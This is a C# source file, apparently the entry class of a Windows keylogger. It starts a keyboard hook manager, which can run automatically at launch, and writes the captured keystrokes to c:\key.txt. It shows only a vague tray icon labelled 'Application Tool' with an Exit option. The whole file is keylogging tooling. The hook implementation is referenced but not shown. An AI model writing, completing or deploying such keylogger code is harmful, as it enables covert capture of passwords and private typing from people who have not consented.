using System;
using System.Collections.Generic;
using System.Windows.Forms;
using System.Text;
using KeyHook;
using Buffer;
using ProcKeyHook.Properties;

namespace KeyProc
{
    public class Main : ApplicationContext
    {
        #region Members

        private NotifyIcon trayIcon;
        private KeyHookManager keyManager;
        private FileManager fileManager = null;

        #endregion

        #region Contructors

        /// <summary>
         /// Main for the 
         /// </summary>
        public Main(bool autostart)
        {
            keyManager = new KeyHookManager();
            fileManager = new FileManager("c:\\key.txt");

            BuildNotifyIconInstance();
            
            //Start the keymanager to Log
            if (autostart)
                Start();
            
        }

        #endregion

        #region Private Memebers

        /// <summary>
        /// Build Notify Icon
        /// </summary>
        private void BuildNotifyIconInstance()
        {
            // tray icon initialization
            trayIcon = new NotifyIcon()
            {
                Text = "Application Tool",
                Icon = Resources.TrayIcon
            };

            // creates a context menu with one Exit item.
            var contextMenu = new ContextMenuStrip();
            var exitMenuItem = new ToolStripMenuItem("Exit");
            contextMenu.Items.Add(exitMenuItem);
            exitMenuItem.Click += this.Exit;

            // we assign the context menu to the tray icon object
            trayIcon.ContextMenuStrip = contextMenu;

            // makes the tray icon visible
            trayIcon.Visible = true;
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Exit(object sender, EventArgs e)
        {
            // Hide tray icon, otherwise it will remain shown until user mouses over it
            trayIcon.Visible = false;
            //Exit the application
            Application.Exit();
        }

        #endregion

        #region Public Memebers

        /// <summary>
        /// Start the process
        /// </summary>
        public void Start()
        {
            if (keyManager!= null)
                keyManager.Start();
            if (fileManager != null)
                fileManager.Start();
        }

        /// <summary>
        /// Stop the process
        /// </summary>
        public void Stop()
        {
            if (keyManager != null)
                keyManager.Stop();
            if (fileManager != null)
                fileManager.Stop();
        }

        #endregion

    }
}
